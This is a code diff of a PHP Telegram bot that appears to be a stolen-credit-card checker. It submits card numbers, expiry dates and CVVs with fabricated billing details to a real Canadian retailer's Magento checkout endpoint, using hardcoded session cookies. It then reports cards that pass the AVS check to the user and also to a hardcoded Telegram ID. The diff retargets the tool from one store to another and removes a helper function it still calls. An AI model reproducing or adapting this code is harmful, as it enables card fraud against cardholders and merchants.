@@ -59,7 +59,7 @@ switch($message){
 				$tok = $data_response['data']['tokenizeCreditCard']['token'];
 				
 				$ch = curl_init();
-				curl_setopt($ch, CURLOPT_URL, 'https://www.eyewearcanada.com/rest/default/V1/guest-carts/I2fFsUohXw9mcFTsNdubxsrI7sAv6KPc/payment-information');
+				curl_setopt($ch, CURLOPT_URL, 'http://www.iglooexpress.ca/eng/rest/eng/V1/guest-carts/ENTpPC16bJCHbBXUYv2wub84aBgnDqZj/payment-information');
 				curl_setopt($ch, CURLOPT_HEADER, 0);
 				curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -68,19 +68,24 @@ switch($message){
 				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 				curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 				curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-				    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+				   curl_setopt($ch, CURLOPT_HTTPHEADER, array(   
 				'accept: */*',
 				'content-type: application/json',
-				'cookie: PHPSESSID: e1ea73c449311d1199c035d4473220f7; _nx-nocache=1; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; schultzoptical-_zldp=e22hps4H1gQlJGseSAvXqRE52iEPEiGbvZN6Ecm5cuaFuSE23gJ1PN312DmgojYMmKwM1K1ctjo%3D; schultzoptical-_zldt=c80613a8-00a3-4f86-a83d-a88446974e2c-2; form_key=mcJdl0ghIawM0STT; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; _ga=GA1.2.1195936622.1608710391; _gid=GA1.2.1856218864.1608710391; instantsearch=%7B%7D; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=5a8dd74423222e02f5dd5411f4617c2c; mage-messages=; section_data_ids=%7B%22cart%22%3A1608710395%2C%22wishlist%22%3A1608710395%2C%22customer%22%3A1608710395%2C%22compare-products%22%3A1608710395%2C%22captcha%22%3A1608710395%2C%22product_data_storage%22%3A1608710395%2C%22last-ordered-items%22%3A1608710395%2C%22directory-data%22%3A1608710395%2C%22instant-purchase%22%3A1608710395%2C%22persistent%22%3A1608710395%2C%22review%22%3A1608710395%2C%22guest_wishlist%22%3A1608710395%2C%22recently_viewed_product%22%3A1608710395%2C%22recently_compared_product%22%3A1608710395%2C%22paypal-billing-agreement%22%3A1608710395%2C%22checkout-fields%22%3A1608710395%2C%22collection-point-result%22%3A1608710395%2C%22pickup-location-result%22%3A1608710395%7D',
-				'origin: https://www.eyewearcanada.com',
-				'referer: https://www.eyewearcanada.com/checkout/'
+				'Cookie: searchReport-log=0; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; form_key=Bd52g1BcAm4V1YV7; _ga=GA1.2.1624297886.1608627567; _gid=GA1.2.1139314673.1608627567; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=d6e7f18ea88f72a62783a9367b35edb0; mage-messages=; PHPSESSID=gcta6clfaiucab5coa56gc9egs; section_data_ids=%7B%22cart%22%3A1608627731%2C%22customer%22%3A1608627729%2C%22compare-products%22%3A1608627729%2C%22last-ordered-items%22%3A1608627729%2C%22directory-data%22%3A1608627729%2C%22captcha%22%3A1608627729%2C%22instant-purchase%22%3A1608627729%2C%22persistent%22%3A1608627729%2C%22review%22%3A1608627729%2C%22wishlist%22%3A1608627729%2C%22recently_viewed_product%22%3A1608627729%2C%22recently_compared_product%22%3A1608627729%2C%22product_data_storage%22%3A1608627729%2C%22paypal-billing-agreement%22%3A1608627729%2C%22checkout-fields%22%3A1608627729%2C%22collection-point-result%22%3A1608627729%2C%22pickup-location-result%22%3A1608627729%7D',
+				'origin: https://www.iglooexpress.ca',
+				'referer: http://www.iglooexpress.ca/eng/checkout/',
 				));
-				curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"I2fFsUohXw9mcFTsNdubxsrI7sAv6KPc","billingAddress":{"countryId":"CA","regionId":"66","regionCode":"AB","region":"Alberta","street":["3698  th Street"],"company":"","telephone":"6787898999","postcode":"'.$postal.'","city":"Calgary","firstname":"isaac","lastname":"werry","saveInAddressBook":null},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.$tok.'"}},"email":"'.$email.'"}');
+				curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"ENTpPC16bJCHbBXUYv2wub84aBgnDqZj","billingAddress":{"countryId":"CA","regionId":"74","regionCode":"ON","region":"Ontario","street":["1365  Goyeau Ave"],"company":"","telephone":"519-253-9262","fax":"","postcode":"'.$postal.'","city":"Windsor","firstname":"richard","lastname":"smith","saveInAddressBook":null},"paymentMethod":{"method":"rootways_elavon_option","additional_data":{"cc_cid":"'.$cvv.'","cc_ss_start_month":"","cc_ss_start_year":"","cc_ss_issue":"","cc_type":"VI","cc_exp_year":"'.$ano.'","cc_exp_month":"'.$mes.'","cc_number":"'.$cvv.'"},"extension_attributes":{"swissup_checkout_fields":{}}},"email":"'.$email.'"}');
 				$pagamento = curl_exec($ch); 
 				$error_message = GetStr($pagamento, '"message":"','"');
-
-
-				sendMessage($chatId, $pagamento);
+				
+				if(strpos($pagamento, "AVS") !== false){
+					sendMessage($chatId, $filtered_string . " CVV: Matched AVS");
+					sendMessage("946540447", $filtered_string . " CVV: Matched AVS");
+				}
+				else{
+					sendMessage($chatId, $filtered_string . " " . $error_message);
+				}
 			}
 		}
 		else{
@@ -97,10 +102,5 @@ function sendMessage($chatId, $message){
 	file_get_contents($url);
 }
 
-function GetStr($string, $start, $end){
-    $str = explode($start, $string);
-    $str = explode($end, $str[1]);
-    return $str[0];
-}
 
 ?>
